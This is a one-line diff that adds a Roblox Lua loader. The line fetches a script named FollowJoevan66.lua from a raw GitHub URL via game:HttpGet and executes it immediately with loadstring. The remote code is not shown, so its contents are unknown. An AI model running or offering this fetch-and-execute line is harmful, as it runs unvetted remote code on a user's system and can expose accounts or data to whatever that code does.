@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/zugkun/CustomShader/refs/heads/main/FollowJoevan66.lua"))()
